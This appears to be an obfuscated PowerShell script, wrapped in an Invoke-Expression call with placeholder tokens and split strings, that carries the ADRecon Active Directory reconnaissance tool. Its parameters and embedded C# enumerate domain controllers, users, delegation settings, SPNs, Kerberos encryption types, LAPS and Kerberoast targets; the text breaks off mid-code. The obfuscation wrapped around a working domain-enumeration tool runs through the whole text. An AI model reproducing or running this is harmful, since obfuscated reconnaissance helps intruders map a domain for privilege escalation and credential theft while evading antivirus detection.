 iEX ( ('

[CmdletBinding()]
param
(
    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajWhich method to use; ADWS (default), LDAPI2aj)]
    [ValidateSet(JQTOyADWSJQTOy, JQTOyLDAPJQTOy)]
    [string] 5I7ELMethod = JQTOyADWSJQTOy,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajDomain Controller IP Address or Domain FQDN.I2aj)]
    [string] 5I7ELDomainController = JQTOyJQTOy,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajDomain Credentials.I2aj)]
   '+' [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajPath for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.I2aj)]
    [string] 5I7ELGenExcel,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajPath for ADRecon output folder to save the CSV/XML/JSON/HTML files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesnJQTOyt exist)I2aj)]
    [string] 5I7ELOutputDir,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajWhich modules to run; Comma separated; e.g Forest,Domain (Default all except ACLs, Kerberoast and DomainAccountsusedforServiceLogon) Valid values include: Forest, Domain, Trusts, Sites, Subnets, SchemaHistory, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupChanges, GroupMembers, OUs, GPOs, gPLinks, DNSZones, DNSRecords, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogonI2aj)]
    [ValidateSet(JQTOyForestJQTOy, JQTOyDomainJQTOy, JQTOyTrustsJQTOy, JQTOySitesJQTOy, JQTOySubnetsJQTOy, JQTOySchemaHistoryJQTOy, JQTOyPasswordPolicyJQTOy, JQTOyFineGrainedPasswordPolicyJQTOy, JQTOyDomainControllersJQTOy, JQTOyUsersJQTOy, JQTOyUserSPNsJQTOy, JQTOyPasswordAttributesJQTOy, JQTOyGroupsJQTOy, JQTOyGroupChangesJQTOy, JQTOyGroupMembersJQTOy, JQTOyOUsJQTOy, JQTOyGPOsJQTOy, JQTOygPLinksJQTOy, JQTOyDNSZonesJQTOy, JQTOyDNSRecordsJQTOy, JQTOyPrintersJQTOy, JQTOyComputersJQTOy, JQTOyComputerSPNsJQTOy, JQTOyLAPSJQTOy, JQTOyBitLockerJQTOy, JQTOyACLsJQTOy, JQTOyGPOReportJQTOy, JQTOyKerberoastJQTOy, JQTOyDomainAccountsusedforServiceLogonJQTOy, JQTOyDefaultJQTOy)]
    [array] 5I7ELCollect = JQTOyDefaultJQTOy,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajOutput type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel)I2aj)]
    [ValidateSet(JQTOySTDOUTJQTOy, JQTOyCSVJQTOy, JQTOyXMLJQTOy, JQTOyJSONJQTOy, JQTOyEXCELJQTOy, JQTOyHTMLJQTOy, JQTOyAllJQTOy, JQTOyDefaultJQTOy)]
    [array] 5I7ELOutputType = JQTOyDefaultJQTOy,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajTimespan for Dormant accounts. Default 90 daysI2aj)]
    [ValidateRange(1,1000)]
    [int] 5I7ELDormantTimeSpan = 90,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajMaximum machine account password age. Default 30 daysI2aj)]
    [ValidateRange(1,1000)]
    [int] 5I7ELPassMaxAge = 30,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajThe PageSize to set for the LDAP searcher object. Default 200I2aj)]
    [ValidateRange(1,10000)]
    [int] 5I7ELPageSize = 200,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajThe number of threads to use during processing of objects. Default 10I2aj)]
    [ValidateRange(1,100)]
    [int] 5I7ELThreads = 10,

    [Parameter(Mandatory = 5I7ELfalse, HelpMessage = I2ajCreate ADRecon Log using Start-TranscriptI2aj)]
    [switch] 5I7ELLog
)

5I7ELADWSSource = @I2aj
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Xml;
using System.Threading;
using System.DirectoryServices;
//using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

using System.Diagnostics;
//using System.IO;
//using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Runtime.InteropServices;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<string, string> AdGroupDictionary = new Dictionary<string, string>();
        private static string DomainSID;
        private static Dictionary<string, string> AdGPODictionary = new Dictionary<string, string>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<string, string> AdSIDDictionary = new Dictionary<string, string>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new string[] {I2aj268435456I2aj, I2aj268435457I2aj, I2aj536870912I2aj, I2aj536870913I2aj} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new string[] { I2aj805306368I2aj } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new string[] { I2aj805306369I2aj }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new string[] { I2aj805306370I2aj } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, I2ajI2aj},
            //{I2aj,I2aj, I2aj;I2aj},
            {I2ajCOlhgI2ajI2aj, I2ajJQTOyI2aj}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(I2aj I2aj, ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, I2ajDomainControllersI2aj);
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, I2ajSchemaHistoryI2aj);
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, I2ajUsersI2aj);
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runPro'+'cessor(AdUsers, numOfThreads, I2ajUserSPNsI2aj);
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, I2ajGroupsI2aj);
            return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, I2ajGroupChangesI2aj);
            return ADRObj;
        }

        public static Object[] Gr'+'oupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, I2ajGroupsDictionaryI2aj);
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, I2ajGroupMembersI2aj);
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, I2ajOUsI2aj);
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, I2ajGPOsI2aj);
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, numOfThreads, I2ajGPOsDictionaryI2aj);
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, I2ajSOMsI2aj);
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, I2ajPrintersI2aj);
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
         '+'   ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, I2ajComputersI2aj);
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj ='+' runProcessor(AdComputers, numOfThreads, I2ajComputerSPNsI2aj);
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, I2ajLAPSI2aj);
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, I2ajSIDDictionaryI2aj);
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, I2ajDACLsI2aj);
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable)'+' PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, I2ajSACLsI2aj);
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case I2ajDomainControllersI2aj:
                    return new DomainControllerRecordProcessor();
                case I2ajSchemaHistoryI2aj:
                    return new SchemaRecordProcessor();
                case I2ajUsersI2aj:
                    return new UserRecordProcessor();
                case I2ajUserSPNsI2aj:
                    return new UserSPNRecordProcessor();
                case I2ajGroupsI2aj:
                    return new GroupRecordProcessor();
                case I2ajGroupChangesI2aj:
                    return new GroupChangeRecordProcessor();
                case I2ajGroupsDictionaryI2aj:
                    return new GroupRecordDictionaryProcessor();
                case I2ajGroupMembersI2aj:
                    return new GroupMemberRecordProcessor();
                case I2ajOUsI2aj:
                    return new OURecordProcessor();
                case I2ajGPOsI2aj:
                    return new GPORecordProcessor();
                case I2ajGPOsDictionaryI2aj:
                    return new GPORecordDictionaryProcessor();
                case I2ajSOMsI2aj:
                    return new SOMRecordProcessor();
                case I2ajPrintersI2aj:
                    return new PrinterRecordProcessor();
                case I2ajComputersI2aj:
                    return new ComputerRecordProcessor();
                case I2ajComputerSPNsI2aj:
                    return new ComputerSPNRecordProcessor();
                case I2ajLAPSI2aj:
                    return new LAPSRecordProcessor();
                case I2ajSIDDictionaryI2aj:
                    return new SIDRecordDictionaryProcessor();
                case I2ajDACLsI2aj:
                    return new DACLRecordProcessor();
                case I2ajSACLsI2aj:
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException(I2ajInvalid processor type I2aj + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

        '+'    public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdDC = (PSObject) record;
                    bool Infra = false;
                    bool Naming = false;
                    bool Schema = false;
                    bool RID = false;
                    bool PDC = false;
                    PSObject DCSMBObj = new PSObject();

                    string OperatingSystem = CleanString((AdDC.Members[I2ajOperatingSystemI2aj].Value != null ? AdDC.Members[I2ajOperatingSystemI2aj].Value : I2aj-I2aj) + I2aj I2aj + AdDC.Members[I2ajOperatingSystemHotfixI2aj].Value + I2aj I2aj + AdDC.Members[I2ajOperatingSystemServicePackI2aj].Value + I2aj I2aj + AdDC.Members[I2ajOperatingSystemVersionI2aj].Value);

                    foreac'+'h (var OperationMasterRole in (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdDC.Members[I2ajOperationMasterRolesI2aj].Value)
                    {
                        switch (OperationMasterRole.ToString())
                        {
                            case I2ajInfrastructureMasterI2aj:
                            Infra = true;
                            break;
                            case I2ajDomainNamingMasterI2aj:
                            Naming = true;
                            break;
                            case I2ajSchemaMasterI2aj:
                            Schema = true;
                            br'+'eak;
                            case I2ajRIDMasterI2aj:
                            RID = true;
                            break;
                            case I2ajPDCEmulatorI2aj:
                            PDC = true;
                            break;
                        }
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty(I2ajDomainI2aj, AdDC.Members[I2ajDomainI2aj].Value));
                    DCObj.Members.Add(new PSNoteProperty(I2ajSiteI2aj, AdDC.Members[I2ajSiteI2aj].Value));
                    DCObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdDC.Members[I2ajNameI2aj].Value));
                    DCObj.Members.Add(new PSNoteProperty(I'+'2ajIPv4AddressI2aj, AdDC.Members[I2ajIPv4AddressI2aj].Value));
                    DCObj.Members.Add(new PSNoteProperty(I2ajOperating SystemI2aj, OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty(I2ajHostnameI2aj, AdDC.Members[I2ajHostNameI2aj].Value));
                    DCObj.Members.Add(new PSNoteProperty(I2ajInfraI2aj, Infra));
                    DCObj.Members.Add(new PSNoteProperty(I2ajNamingI2aj, Naming));
                    DCObj.Members.Add(new PSNoteProperty(I2ajSchemaI2aj, Sch'+'ema));
                    DCObj.Members.Add(new PSNoteProperty(I2ajRIDI2aj, RID));
                    DCObj.Members.Add(new PSNoteProperty(I'+'2ajPDCI2aj, PDC));
                    if (AdDC.Members[I2ajIPv4AddressI2aj].Value != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.Members[I2ajIPv4AddressI2aj].Value);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB Port OpenI2aj, false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == I2ajSMB Port OpenI2aj && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB1(NT LM 0.12)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0202)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0210)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0300)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0302)I2aj, null));
                            DCObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0311)I2aj, null));
 '+'                           DCObj.Members.Add(new PSNoteProperty(I2ajSMB SigningI2aj, null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2aj{0} Exception caught.I2aj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSchema = (PSObject) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajObjectClassI2aj, AdSchema.Members[I2ajObjectClassI2aj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, AdSchema.Members[I2ajNameI2aj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajwhenCreatedI2aj, AdSchema.Members[I2ajwhenCreatedI2aj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajwhenChangedI2aj, AdSchema.Members[I2ajwhenChangedI2aj].Value));
                    SchemaObj.Members.Add(new PSNoteProperty(I2ajDistinguishedNameI2aj, AdSchema.Members[I2ajDistinguishedNameI2aj].Value));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    return new PSObject[] { };
 '+'               }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    string SIDHistory = I2ajI2aj;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    bool? AccountNotDelegated = null;
                    bool? HasSPN = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members[I2ajEnabledI2aj].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                    }
                    if (AdUser.Members[I2ajlastLogonTimeStampI2aj].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members[I2ajlastLogonTimeStampI2aj].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members[I2ajLastLogonDateI2aj].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members[I2ajpwdLastSetI2aj].Value) == I2aj0I2aj)
                    {
                        if ((bool) AdUser.Members[I2ajPasswordNeverExpiresI2aj].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members[I2ajPasswordLastSetI2aj].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members[I2ajpwdLastSetI2aj].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDa'+'teTime(AdUser.Members[I2ajPasswordLastSetI2aj].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members[I2ajaccountExpiresI2aj].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members[I2ajaccountExpiresI2aj].Value != (Int64) 0)
                        if ('+'AdUser.Members[I2ajAccountExpirationDateI2aj].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members[I2ajaccountExpiresI2aj].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members[I2ajAccountExpirationDateI2aj].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine(I2ajException caught: {0}I2aj, e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members[I2ajSIDHistoryI2aj].Value;
                    string sids = I2ajI2aj;
                    foreach (var value in history)
                    {
                        sids = sids + I2aj,I2aj + Convert.ToString(value);
                    }
                    SIDHistory = sids.TrimStart(JQTOy,JQTOy);
                    if (AdUser.Members[I2ajmsDS-SupportedEncryptionTypesI2aj].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members[I2ajmsDS-SupportedEncryptionTypesI2aj].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if (AdUser.Members[I2ajUserAccountControlI2aj].Value != null)
                    {
                        AccountNotDelegated = !((bool) AdUser.Members[I2ajAccountNotDelegatedI2aj].Value);
                        if ((bool) AdUser.Members[I2ajTrustedForDelegationI2aj].Value)
                        {
                            DelegationType = I2ajUnconstrainedI2aj;
                            DelegationServices = I2ajAnyI2aj;
                        }
                        if (AdUser.Members[I2ajmsDS-AllowedToDelegateToI2aj] != null)
                        {
                            Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members[I2ajmsDS-AllowedToDelegateToI2aj].Value;
                            if (delegateto.Value != null)
                            {
                                DelegationType = I2ajConstrainedI2aj;
                                foreach (var value in delegateto)
                                {
                                    DelegationServices = DelegationServices + I2aj,I2aj + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(JQTOy,JQTOy);
                            }
                        }
                        if ((bool) AdUser.Members[I2ajTrustedToAuthForDelegationI2aj].Value == true)
                        {
                            DelegationProtocol = I2ajAnyI2aj;
                        }
    '+'                    else if (DelegationType != null)
                        {
                            DelegationProtocol = I2ajKerberosI2aj;
                        }
                    }

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members[I2ajservicePrincipalNameI2aj].Value;
                    if (SPNs.Valu'+'e == null)
                    {
                        HasSPN = false;
                    }
                    else
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty(I2ajUserNameI2aj, CleanString(AdUser.Members[I2ajSamAccountNameI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajNameI2aj, CleanString(AdUser.Members[I2ajNameI2aj].Value)));
                    UserObj.Members.Add(new PSNoteProperty(I2ajEnabledI2aj, Enabled));
                    UserObj.Members.Add(new PSNoteProperty(I2ajMust Change Password at LogonI2aj, MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty(I2ajCannot Change PasswordI2aj, AdUser.Members[I2ajCannotChangePasswordI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Never ExpiresI2aj, AdUser.Members[I2ajPasswordNeverExpiresI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajReversible Password EncryptionI2aj, AdUser.Members[I2ajAllowReversiblePasswordEncryptionI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajSmartcard Logon Req'+'uiredI2aj, AdUser.Members[I2ajSmartcardLogonRequiredI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation PermittedI2aj, AccountNotDelegated));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos DES OnlyI2aj, AdUser.Members[I2ajUseDESKeyOnlyI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos RC4I2aj, KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos AES-128bitI2aj, KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty(I2ajKerberos AES-256bitI2aj, KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDoes Not Require Pre AuthI2aj, AdUser.Members[I2ajDoesNotRequirePreAuthI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajNever Logged inI2aj, NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty(I2ajLogon Age (days)I2aj, DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Age (days)I2aj, DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDormant (> I2aj + DormantTimeSpan + I2aj days)I2aj, Dormant));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Age (> I2aj + PassMaxAge + I2aj days)I2aj, PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty(I2ajAccount Locked OutI2aj, AdUser.Members[I2ajLockedOutI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword ExpiredI2aj, AdUser.Members[I2ajPasswordExpiredI2aj].Value));
                    UserObj.Members.Add(new PSNoteProperty(I2ajPassword Not RequiredI2aj, AdUser.Members[I2ajPasswordNotRequiredI2aj].Value));
                    UserObj.Membe'+'rs.Add(new PSNoteProperty(I2ajDelegation TypeI2aj, DelegationType));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation ProtocolI2aj, DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty(I2ajDelegation ServicesI2aj, DelegationServices));
